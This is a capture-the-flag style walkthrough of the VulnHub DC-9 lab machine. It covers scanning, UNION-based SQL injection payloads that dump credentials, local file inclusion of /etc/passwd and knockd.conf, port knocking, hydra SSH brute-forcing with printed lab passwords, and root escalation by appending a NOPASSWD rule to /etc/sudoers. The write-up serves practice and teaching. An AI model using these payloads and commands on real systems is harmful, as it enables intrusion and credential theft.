# DC-9 | VulnHub
https://www.vulnhub.com/entry/dc-9,412/

### 1. Scan
```bash
Nmap scan report for 192.168.34.140
Host is up, received arp-response (0.00069s latency).
Scanned at 2021-07-03 01:40:25 EDT for 13s
Not shown: 65533 closed ports
Reason: 65533 resets
PORT   STATE    SERVICE REASON         VERSION
22/tcp filtered ssh     no-response
80/tcp open     http    syn-ack ttl 64 Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Example.com - Staff Details - Welcome
MAC Address: 00:0C:29:B2:96:83 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=7/3%OT=80%CT=1%CU=42033%PV=Y%DS=1%DC=D%G=Y%M=000C29%TM
OS:=60DFF856%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=107%TI=Z%CI=Z%II=I%
OS:TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5
OS:=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=
OS:7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%
OS:A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0
OS:%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S
OS:=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R
OS:=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N
OS:%T=40%CD=S)

Uptime guess: 33.525 days (since Sun May 30 13:04:03 2021)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE
HOP RTT     ADDRESS
1   0.69 ms 192.168.34.140

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul  3 01:40:38 2021 -- 1 IP address (1 host up) scanned in 14.06 seconds
```
The machine is running SSH and an Apache web server.

### 2. Enumerate website
The website is a "staff details" web app that allows you to search for staff in a database. This screams SQL injection right off the bat. Searching for `Scott' or 1=1-- ` returns all the records. That's a good sign.

### 3. Exploit SQL Injection
Firstly obtain the number of columns by taking the first query and using `order by` to test the existance of a column number. Enumerating upwards from 1,2,3 etc, `Scott' or 1=1 order by 6;-- ` is the last query that returns results. So there are 6 columns in this table.
  
Next, verify this column number by adding in a union with all nulls: `test' union select null, null, null, null, null, null;-- `.
This returns an entry with nothing in it.
```
ID:
Name:
Position:
Phone No:
Email: 
```

Identify some string datatyped columns with `test' union select @@version, @@version, null, null, null, null;-- `. This returns more good news.
```
ID: 10.3.17-MariaDB-0+deb10u1
Name: 10.3.17-MariaDB-0+deb10u1
Position:
Phone No:
Email: 
```

To enumerate database columns now, look at the information schema by injecting a query to return the columns in the current database. This is done with `test' union select table_name, column_name, null, null, null, null from information_schema.columns;-- `. It returns a lot of output.
```
...
ID: Users
Name: UserID
Position:
Phone No:
Email:

ID: Users
Name: Username
Position:
Phone No:
Email:

ID: Users
Name: Password
Position:
Phone No:
Email:
...

```
This looks what we want to get. Retrieve the contents with `test' union select concat(Username, ':', Password), null, null, null, null, null from Users;-- `. One result comes back.
```
ID: admin:856f5de590ef37314e7c3bdf6f8a66dc
Name:
Position:
Phone No:
Email: 
```
The password cracks, and a set of creds is retrieved: `admin:transorbital1`

### 4. Log in to the site
These creds allow access to the admin panel of thje site. There is some functionality to add records to the database. After playing with this a bunch, there doesn't appear to be any useful function with this. The only other thing of note is that at the bottom of the page is a "File does not exist" message. Using this cue, browsing to http://192.168.34.140/manage.php?file=../../../../../../etc/passwd shows the linux passwd file on screen.  
  
### 5. Explore the LFI
Interestingly, I see a lot of the users have shell accounts on the system. Going back to the SQL Injection, retrieve the passwords to each user with `test' union select concat(Username, ':', Password), null, null, null, null, null from users.UserDetails;-- `. The passwords come out in plaintext (see creds.txt).

```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ cat creds.txt 
marym:3kfs86sfd
julied:468sfdfsd2
fredf:4sfd87sfd1
barneyr:RocksOff
tomc:TC&TheBoyz
jerrym:B8m#48sd
wilmaf:Pebbles
bettyr:BamBam01
chandlerb:UrAG0D!
joeyt:Passw0rd
rachelg:yN72#dsd
rossg:ILoveRachel
monicag:3248dsds7s
phoebeb:smellycats
scoots:YR3BVxxxw87
janitor:Ilovepeepee
janitor2:Hawaii-Five-0
```

If any of these creds are valid on the machine, then access over SSH is possible. However SSH is filtered on the machine, so accessing it doesn't work. Filtering might indicate there is a port knocking application active, so this can be searched for within the output of http://192.168.34.140/manage.php?file=../../../../../../proc/sched_debug.
```
resolve 517 2989.318880 10 120 0.000000 4.077722 0.000000 0 0 / S knockd 493 2962.581370 29 120 0.000000 7.444837 
```

Knockd is indeed present on the machine. The config file for the service is located at knockd.conf: http://192.168.34.140/manage.php?file=../../../../../../etc/knockd.conf.
```
[options] UseSyslog [openSSH] sequence = 7469,8475,9842 seq_timeout = 25 command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn [closeSSH] sequence = 9842,8475,7469 seq_timeout = 25 command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn 
```
The open SSH sequence is seen to be 7469,8475,9842.

### 6. Open up SSH
Attempt to connect on each port, then confirm the port is now open.
```bash
┌──(kali㉿kali)-[]-[~/Extra-Tools/utils]
└─$ nc 192.168.34.140 7469                       
(UNKNOWN) [192.168.34.140] 7469 (?) : Connection refused
                                                                                                                                        
┌──(kali㉿kali)-[]-[~/Extra-Tools/utils]
└─$ nc 192.168.34.140 8475
(UNKNOWN) [192.168.34.140] 8475 (?) : Connection refused
                                                                                                                                        
┌──(kali㉿kali)-[]-[~/Extra-Tools/utils]
└─$ nc 192.168.34.140 9842
(UNKNOWN) [192.168.34.140] 9842 (?) : Connection refused
                                                                                                                                        
┌──(kali㉿kali)-[]-[~/Extra-Tools/utils]
└─$ nmap -sV -p 22 192.168.34.140
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-03 03:03 EDT
Nmap scan report for 192.168.34.140
Host is up (0.00061s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.39 seconds
```

### 7. Attack SSH
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ hydra -C creds.txt -e nsr -s 22 ssh://192.168.34.140 -t 4 
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-03 03:08:44
[DATA] max 4 tasks per 1 server, overall 4 tasks, 68 login tries, ~17 tries per task
[DATA] attacking ssh://192.168.34.140:22/
[22][ssh] host: 192.168.34.140   login: chandlerb   password: UrAG0D!
[22][ssh] host: 192.168.34.140   login: joeyt   password: Passw0rd
[22][ssh] host: 192.168.34.140   login: janitor   password: Ilovepeepee
1 of 1 target successfully completed, 3 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-07-03 03:09:25
```
Credentials found:  
- `chandlerb:UrAG0D!`  
- `joeyt:Passw0rd`  
- `janitor:Ilovepeepee`  

### 8. Enumerate users
Run some commands from SSH to determine which user to start with.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ ssh chandlerb@192.168.34.140 "id; ls -la"                                                                                     130 ⨯
chandlerb@192.168.34.140's password: 
uid=1009(chandlerb) gid=1009(chandlerb) groups=1009(chandlerb)
total 12
drwx------  3 chandlerb chandlerb 4096 Jul  3 17:09 .
drwxr-xr-x 19 root      root      4096 Dec 29  2019 ..
lrwxrwxrwx  1 chandlerb chandlerb    9 Dec 29  2019 .bash_history -> /dev/null
drwx------  3 chandlerb chandlerb 4096 Jul  3 17:09 .gnupg
                                                                                                                                        
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ ssh joeyt@192.168.34.140 "id; ls -la"
joeyt@192.168.34.140's password: 
uid=1010(joeyt) gid=1010(joeyt) groups=1010(joeyt)
total 12
drwx------  3 joeyt joeyt 4096 Jul  3 17:09 .
drwxr-xr-x 19 root  root  4096 Dec 29  2019 ..
lrwxrwxrwx  1 joeyt joeyt    9 Dec 29  2019 .bash_history -> /dev/null
drwx------  3 joeyt joeyt 4096 Jul  3 17:09 .gnupg
                                                                                                                                        
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ ssh janitor@192.168.34.140 "id; ls -la"
janitor@192.168.34.140's password: 
uid=1016(janitor) gid=1016(janitor) groups=1016(janitor)
total 16
drwx------  4 janitor janitor 4096 Jul  3 17:09 .
drwxr-xr-x 19 root    root    4096 Dec 29  2019 ..
lrwxrwxrwx  1 janitor janitor    9 Dec 29  2019 .bash_history -> /dev/null
drwx------  3 janitor janitor 4096 Jul  3 17:09 .gnupg
drwx------  2 janitor janitor 4096 Dec 29  2019 .secrets-for-putin
```

Only the "janitor" user has a something in their directory.
```bash
janitor@dc-9:~$ ls -l .secrets-for-putin/
total 4
-rwx------ 1 janitor janitor 66 Dec 29  2019 passwords-found-on-post-it-notes.txt
janitor@dc-9:~$ ls .secrets-for-putin/
passwords-found-on-post-it-notes.txt
janitor@dc-9:~$ cat .secrets-for-putin/passwords-found-on-post-it-notes.txt 
BamBam01
Passw0rd
smellycats
P0Lic#10-4
B4-Tru3-001
4uGU5T-NiGHts
```
Great, more passwords.

### 9. Attack SSH again and log in
Take these new passwords and go back over the user list with ssh.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ hydra -L users.txt -P passwords.txt -e nsr -s 22 ssh://192.168.34.140 -t 4
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-03 03:18:09
[DATA] max 4 tasks per 1 server, overall 4 tasks, 153 login tries (l:17/p:9), ~39 tries per task
[DATA] attacking ssh://192.168.34.140:22/
[22][ssh] host: 192.168.34.140   login: fredf   password: B4-Tru3-001
[22][ssh] host: 192.168.34.140   login: joeyt   password: Passw0rd
[STATUS] 100.00 tries/min, 100 tries in 00:01h, 53 to do in 00:01h, 4 active
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-07-03 03:19:50
```
Another user credential set is recovered: `fredf:B4-Tru3-001`. Log into this user over SSH.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ ssh fredf@192.168.34.140      
fredf@192.168.34.140's password: 
Linux dc-9 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
fredf@dc-9:~$ id
uid=1003(fredf) gid=1003(fredf) groups=1003(fredf)
```

### 10. Enumerate from user
Turns out fredf can run a file as root.
```bash
fredf@dc-9:~$ sudo -l
Matching Defaults entries for fredf on dc-9:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User fredf may run the following commands on dc-9:
    (root) NOPASSWD: /opt/devstuff/dist/test/test
fredf@dc-9:~$ ls -l /opt/devstuff/dist/test/test
-rwxr-xr-x 1 root root 1212968 Dec 29  2019 /opt/devstuff/dist/test/test
fredf@dc-9:~$ /opt/devstuff/dist/test/test
Usage: python test.py read append
```

Interestingly the usage indicates a "test.py" file should be run with Python..? Looking around, there is a test.py in devstuff/.
```bash
fredf@dc-9:/opt/devstuff$ ls
build  dist  __pycache__  test.py  test.spec
fredf@dc-9:/opt/devstuff$ cat test.py
#!/usr/bin/python

import sys

if len (sys.argv) != 3 :
    print ("Usage: python test.py read append")
    sys.exit (1)

else :
    f = open(sys.argv[1], "r")
    output = (f.read())

    f = open(sys.argv[2], "a")
    f.write(output)
    f.close()
```

Ok now it makes sense. The test binary is running this file. This python script appends the content of one file onto another file. Assuming there is some way to pass the arguments with the binary, this should allow for privilege esclation. Let's try this quickly.
```bash
fredf@dc-9:/tmp$ echo "TEST1" > file1
fredf@dc-9:/tmp$ touch file2
fredf@dc-9:/tmp$ ls -l file*
-rw-r--r-- 1 fredf fredf 6 Jul  3 17:41 file1
-rw-r--r-- 1 fredf fredf 0 Jul  3 17:41 file2
fredf@dc-9:/tmp$ sudo /opt/devstuff/dist/test/test /tmp/file1 /tmp/file2
fredf@dc-9:/tmp$ cat file2
TEST1
```
That worked.

### 11. Escalate to root
Create a file with a line which will allow the current user to sudo without password to run whatever they want, then append that to /etc/sudoers.
```bash
fredf@dc-9:/tmp$ echo "fredf ALL=(ALL) NOPASSWD: ALL" > file1
fredf@dc-9:/tmp$ sudo /opt/devstuff/dist/test/test /tmp/file1 /etc/sudoers
fredf@dc-9:/tmp$ sudo -l
Matching Defaults entries for fredf on dc-9:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User fredf may run the following commands on dc-9:
    (root) NOPASSWD: /opt/devstuff/dist/test/test
    (ALL) NOPASSWD: ALL
```

Now go straight to root.
```bash
fredf@dc-9:/tmp$ sudo -i
root@dc-9:~# whoami
root
```